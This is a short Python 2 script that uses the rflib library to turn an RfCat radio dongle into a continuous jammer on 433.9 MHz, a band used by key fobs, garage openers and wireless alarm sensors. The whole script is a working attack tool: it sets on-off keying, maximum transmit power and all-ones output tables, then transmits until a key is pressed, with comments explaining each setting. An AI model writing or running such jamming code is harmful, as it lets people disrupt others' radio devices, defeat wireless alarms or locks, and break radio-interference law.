
from rflib import *
import time

d = RfCat(idx=1) # pick which  dongle to use  idx=0 idx=1
d.setFreq(433900000) # frequency to jam at
d.setMdmModulation(MOD_ASK_OOK) #on of keying
d.setMdmDRate(int(1.0/0.0006)) # how long we play each bit
d.setMdmChanSpc(24000) # how wide channel is
d.setMaxPower() # max power for transmitting
d.setRFRegister(PA_TABLE0,0xFF) # data jammer sends 
d.setRFRegister(PA_TABLE1,0xFF) # data jammer sends 
d.makePktFLEN(255) # set packet  size

print "Starting"
d.setModeTX() # start transmitting 
raw_input("Enter to stop jamming")
print 'done'
d.setModeIDLE() # put dongle in idle mode to stop jamming
